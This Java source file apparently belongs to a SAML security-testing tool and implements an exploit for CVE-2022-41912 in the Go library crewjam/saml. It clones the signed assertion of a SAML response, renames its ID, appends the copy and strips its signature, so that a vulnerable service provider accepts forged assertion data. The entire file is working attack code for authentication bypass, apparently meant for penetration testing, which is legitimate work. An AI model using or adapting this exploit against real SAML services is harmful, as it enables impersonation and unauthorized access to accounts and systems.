package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Links:
/// * CVE-2022-41912: https://nvd.nist.gov/vuln/detail/CVE-2022-41912
/// * Vulnerable Library: crewjam/saml (Go)
/// * Description: The library verifies the signature of the first assertion but may consume data from a subsequent assertion.
public class CVE_2022_41912 {

    public static final String CVE = "CVE-2022-41912";

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        // the xml must contain a response
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        if (response == null) {
            throw new IllegalArgumentException("No 'Response' element found.");
        }

        // get the first assertion (the true one)
        Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (originalAssertion == null) {
            throw new IllegalArgumentException("No 'Assertion' element found.");
        }

        // we can then copy it to create our fake assertion
        Element maliciousAssertion = (Element) originalAssertion.cloneNode(true);

        // I think it's better to change the ID of the fake assertion
        String originalID = maliciousAssertion.getAttribute("ID");
        if (!originalID.isEmpty()) {
            maliciousAssertion.setAttribute("ID", originalID + "_attack");
        } else {
            maliciousAssertion.setAttribute("ID", "attack_assertion_" + System.currentTimeMillis());
        }

        response.appendChild(maliciousAssertion);

        // finally we have to remove the signature so the parser will not see that its fake
        // --- CLEAN REMOVAL OF SIGNATURE AND SPACES ---
        NodeList children = maliciousAssertion.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node child = children.item(i);

            // Search for the Signature element
            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {

                // 1. Identify and delete the text node (space/indentation) JUST BEFORE the signature
                Node prev = child.getPreviousSibling();
                if (prev != null && prev.getNodeType() == Node.TEXT_NODE && prev.getTextContent().trim().isEmpty()) {
                    maliciousAssertion.removeChild(prev);
                }

                // 2. Delete the signature itself
                maliciousAssertion.removeChild(child);

                break;
            }
        }

        return xmlHelpers.getString(document);
    }

    private CVE_2022_41912() {
        // static class
    }
}